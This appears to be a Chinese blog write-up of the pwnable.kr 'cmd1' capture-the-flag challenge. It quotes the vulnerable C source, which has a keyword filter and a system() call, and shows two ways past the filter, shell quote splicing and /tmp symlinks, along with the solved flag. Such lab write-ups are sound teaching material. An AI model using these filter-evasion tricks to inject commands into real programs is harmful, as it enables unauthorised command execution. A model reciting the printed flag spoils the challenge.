---
id: 66
title: pwnable.kr-cmd1
date: 2016-08-09T10:12:27+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=66
permalink: /pwnable-kr-cmd1/
categories:
  - pwn
tags:
  - cmd
  - pwnable.kr
  - shell拼接
---
题目描述：

> Mommy! what is PATH environment in Linux?
> 
> ssh cmd1@pwnable.kr -p2222 (pw:guest)

cmd1.c的源码为：

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int filter(char* cmd){
 int r=0;
 r += strstr(cmd, "flag")!=0;
 r += strstr(cmd, "sh")!=0;
 r += strstr(cmd, "tmp")!=0;
 return r;
}
int main(int argc, char* argv[], char** envp){
 putenv("PATH=/fuckyouverymuch");
 if(filter(argv[1])) return 0;
 system( argv[1] );
 return 0;
}
</pre>

看起来过滤了flag,sh,tmp，没有关系，通过shell下面指令拼接可以绕过：

&#8220;/bin/cat &#8216;fl&#8221;ag'&#8221;

> cmd1@ubuntu:~$ ./cmd1 &#8220;/bin/cat &#8216;fl&#8221;ag'&#8221;
  
> mommy now I get what PATH environment is for 🙂

所以最终的flag为：

mommy now I get what PATH environment is for 🙂

&nbsp;

这里更新一种方法：

> cmd1@ubuntu:~$ ls
  
> cmd1 cmd1.c flag
  
> cmd1@ubuntu:~$ mkdir /tmp/cmd1
  
> cmd1@ubuntu:~$ cd /tmp/cmd1
  
> cmd1@ubuntu:/tmp/cmd1$ ln -s /home/cmd1/cmd1 cmd1
  
> cmd1@ubuntu:/tmp/cmd1$ ls
  
> cmd1
  
> cmd1@ubuntu:/tmp/cmd1$ ln -s /home/cmd1/flag f
  
> cmd1@ubuntu:/tmp/cmd1$ ./cmd1 &#8220;/bin/cat f&#8221;
  
> mommy now I get what PATH environment is for 🙂

在/tmp下新建ln，这里就可以绕过对flag的过滤